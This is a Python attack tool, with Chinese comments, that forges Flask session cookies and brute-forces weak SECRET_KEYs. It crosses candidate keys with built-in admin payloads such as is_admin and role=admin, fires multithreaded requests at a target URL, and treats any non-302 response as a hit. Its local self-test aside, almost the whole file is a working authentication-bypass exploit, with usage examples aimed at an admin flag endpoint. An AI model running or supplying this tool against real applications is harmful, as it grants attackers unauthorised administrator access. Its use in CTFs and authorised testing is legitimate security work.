#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
flask_session_forge.py — Flask session cookie 伪造 + 弱密钥/载荷爆破
(蒸馏自 /app/skills_staging/a03_brute_admin.py 与 a03_flask_forge.py)

背景: Flask 默认 session 是 itsdangerous 签名 cookie:
  cookie 值 = urlsafe_b64(json).urlsafe_b64(ts).urlsafe_b64(hmac_sha1(msg))
  其中 HMAC 密钥 = SHA1(secret + b"cookie-session")。
当 SECRET_KEY 弱/可猜(常见于 CTF 与弱配置)时, 可离线伪造任意 session。
本工具统一了原两个脚本的能力:
  * 离线伪造 cookie(--print-only, 无需网络);
  * 密钥字典爆破: 固定载荷 + 目标路径, 非 302 响应视为命中(原 a03_brute_admin.py);
  * 密钥 x 载荷 组合爆破: 多线程探测(原 a03_flask_forge.py);
  * 可自定义 cookie 名、附加请求头、排除的状态码。

用法:
  # 1) 单密钥单载荷, 只打印伪造的 cookie(离线, 不发包)
  python3 flask_session_forge.py --key mysecret --payload '{"is_admin":true}' --print-only

  # 2) 密钥字典爆破(固定载荷与路径; 默认排除 302 重定向, 其余状态视为命中)
  python3 flask_session_forge.py --keys keys.txt \
      --payload '{"user_id":1,"username":"admin","is_admin":true}' \
      --url http://10.0.0.5:8000/admin/flag --threads 15

  # 3) 密钥 x 载荷 组合爆破(载荷文件为 JSON Lines)
  python3 flask_session_forge.py --keys keys.txt --payloads payloads.jsonl \
      --url http://10.0.0.5:8000/api/search --threads 30

  # 4) 自检(纯本地, 无需外部网络)
  python3 flask_session_forge.py --selftest
"""
import argparse
import base64
import hashlib
import hmac
import http.server
import json
import sys
import threading
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor

DEFAULT_EXCLUDE = [302]
DEFAULT_PAYLOADS = [
    {"username": "admin"},
    {"user": "admin"},
    {"user_id": 1},
    {"uid": 1},
    {"id": 1},
    {"role": "admin"},
    {"is_admin": True},
    {"admin": True},
    {"logged_in": True},
    {"authenticated": True},
    {"user_id": 1, "role": "admin"},
    {"username": "admin", "role": "admin"},
    {"username": "admin", "is_admin": True},
    {"user_id": 1, "username": "admin", "is_admin": True, "role": "admin"},
]


# ---------- Flask cookie 编解码/签名(核心逻辑, 与原始脚本一致) ----------

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def b64d(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def num_to_bytes(n):
    if n == 0:
        return b"\x00"
    out = b""
    while n > 0:
        out = bytes([n & 0xFF]) + out
        n >>= 8
    return out


def _signing_key(secret):
    # itsdangerous 的密钥派生: HMAC 密钥 = SHA1(secret + b"cookie-session")
    return hmac.new(secret.encode(), b"cookie-session", hashlib.sha1).digest()


def forge(secret, data, ts=None):
    """用 secret 伪造一个 Flask session cookie。ts 可固定(便于离线复现)。"""
    payload = json.dumps(data, separators=(",", ":")).encode()
    v = b64e(payload)
    if ts is None:
        ts = int(time.time())
    t = b64e(num_to_bytes(ts))
    msg = v + "." + t
    sig = hmac.new(_signing_key(secret), msg.encode(), hashlib.sha1).digest()
    return msg + "." + b64e(sig)


def parse(cookie):
    """解析 cookie, 返回 (payload_dict, ts, sig_b64)。格式非法时抛 ValueError。"""
    parts = cookie.split(".")
    if len(parts) != 3:
        raise ValueError("cookie must have 3 dot-separated parts")
    v, t, sig = parts
    payload = json.loads(b64d(v).decode("utf-8"))
    tb = b64d(t)
    ts = int.from_bytes(tb, "big") if tb else 0
    return payload, ts, sig


def verify(cookie, secret):
    """校验 cookie 的签名是否为 secret 所签。"""
    try:
        v, t, sig = cookie.split(".")
    except ValueError:
        return False
    msg = v + "." + t
    expect = hmac.new(_signing_key(secret), msg.encode(), hashlib.sha1).digest()
    try:
        return hmac.compare_digest(b64d(sig), expect)
    except Exception:
        return False


# ---------- HTTP 探测 ----------

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def probe(url, cookie, cookie_name="session", headers=None, timeout=8):
    """带伪造 cookie 请求 url, 返回 (status, body)。重定向不跟随。"""
    hdrs = {"Cookie": "%s=%s" % (cookie_name, cookie)}
    for h in headers or []:
        name, _, value = h.partition(":")
        hdrs[name.strip()] = value.strip()
    req = urllib.request.Request(url, headers=hdrs)
    opener = urllib.request.build_opener(NoRedirect())
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return "ERR", str(e)


# ---------- 自检(纯本地, 不依赖外部网络) ----------

def selftest():
    ok = True

    def check(name, cond):
        nonlocal ok
        print("[%s] %s" % ("PASS" if cond else "FAIL", name))
        ok = ok and cond

    # base64 url-safe 往返
    for raw in (b"", b"a", b"\x00\x01\xff", b"hello world" * 10):
        check("b64 round trip %dB" % len(raw), b64d(b64e(raw)) == raw)

    # num_to_bytes / int 往返
    for n in (0, 1, 255, 256, 123456789, 2 ** 64 - 1):
        check("num_to_bytes %d" % n, int.from_bytes(num_to_bytes(n), "big") == n)

    # forge -> parse 往返(固定 ts, 确定性)
    secret = "s3cr3t"
    payload = {"user_id": 1, "username": "admin", "is_admin": True}
    c = forge(secret, payload, ts=1700000000)
    parsed, ts, _ = parse(c)
    check("forge/parse payload round trip",
          parsed == payload and ts == 1700000000 and c.count(".") == 2)

    # 签名校验: 正确密钥通过, 错误密钥/篡改载荷拒绝
    check("verify ok with correct secret", verify(c, secret))
    check("verify fails with wrong secret", not verify(c, "wrong"))
    check("verify rejects malformed", not verify("a.b", secret))
    parts = c.split(".")
    tampered = b64e(json.dumps({"is_admin": False}, separators=(",", ":")).encode()) \
        + "." + parts[1] + "." + parts[2]
    check("verify fails on tampered payload", not verify(tampered, secret))

    # 本地 HTTP 端到端: 探测 + 302/200 分类逻辑(127.0.0.1, 非外部网络)
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith("/admin"):
                self.send_response(302)
                self.send_header("Location", "/login")
                self.end_headers()
            else:
                body = b"ok"
                self.send_response(200)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        s1, _ = probe("http://127.0.0.1:%d/admin" % port, "c", timeout=3)
        s2, _ = probe("http://127.0.0.1:%d/api" % port, "c", timeout=3)
        check("local probe: 302 on /admin", s1 == 302)
        check("local probe: 200 on /api", s2 == 200)
        check("exclude-status default", 302 in DEFAULT_EXCLUDE and 200 not in DEFAULT_EXCLUDE)
    finally:
        srv.shutdown()

    print("selftest:", "PASS" if ok else "FAIL")
    return ok


# ---------- 主流程 ----------

def load_lines(path):
    with open(path) as f:
        return [ln.strip() for ln in f if ln.strip()]


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Flask session cookie forger / weak-secret & payload brute-forcer")
    ap.add_argument("--key", help="single candidate SECRET_KEY")
    ap.add_argument("--keys", help="file of candidate SECRET_KEYs (one per line)")
    ap.add_argument("--payload", help="single payload JSON, e.g. '{\"is_admin\": true}'")
    ap.add_argument("--payloads", help="file of payloads (JSON Lines)")
    ap.add_argument("--url", help="full target URL to probe with forged cookie")
    ap.add_argument("--cookie-name", default="session", help="cookie name (default: session)")
    ap.add_argument("--header", action="append", default=[],
                    help="extra request header 'Name: value' (repeatable)")
    ap.add_argument("--exclude-status", type=int, action="append", default=[],
                    help="status codes treated as failure (default: 302); repeatable")
    ap.add_argument("--threads", type=int, default=15)
    ap.add_argument("--timeout", type=float, default=8)
    ap.add_argument("--print-only", action="store_true",
                    help="only print forged cookie(s), no network")
    ap.add_argument("--selftest", action="store_true", help="run local self-test and exit")
    args = ap.parse_args(argv)

    if args.selftest:
        return 0 if selftest() else 1

    keys = (["%s" % args.key] if args.key else []) + \
           (load_lines(args.keys) if args.keys else [])
    if not keys:
        ap.error("need --key or --keys")

    if args.payload:
        payloads = [json.loads(args.payload)]
    elif args.payloads:
        payloads = [json.loads(ln) for ln in load_lines(args.payloads)]
    else:
        payloads = DEFAULT_PAYLOADS

    exclude = args.exclude_status or DEFAULT_EXCLUDE

    if args.print_only:
        for key in keys:
            for p in payloads:
                print("%s\t%s\t%s" % (key, json.dumps(p, separators=(",", ":")), forge(key, p)))
        return 0

    if not args.url:
        ap.error("need --url (or use --print-only / --selftest)")

    total = len(keys) * len(payloads)
    found = []

    def work(item):
        key, p = item
        c = forge(key, p)
        status, body = probe(args.url, c, args.cookie_name, args.header, args.timeout)
        return key, p, c, status, body

    print("[*] candidates=%d keys=%d payloads=%d url=%s exclude=%s threads=%d" %
          (total, len(keys), len(payloads), args.url, exclude, args.threads), flush=True)
    t0 = time.time()
    items = [(k, p) for k in keys for p in payloads]
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for i, (key, p, c, status, body) in enumerate(ex.map(work, items)):
            if status not in exclude:
                found.append((key, p, c, status, body))
                print("[!] HIT key=%r payload=%r -> %s body=%r" %
                      (key, p, status, body[:200]), flush=True)
            if (i + 1) % 500 == 0:
                print("    %d/%d elapsed=%.0fs" % (i + 1, total, time.time() - t0), flush=True)
    print("=== done ===", flush=True)
    for key, p, c, status, body in found:
        print(json.dumps({"key": key, "payload": p, "cookie": c, "status": status}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
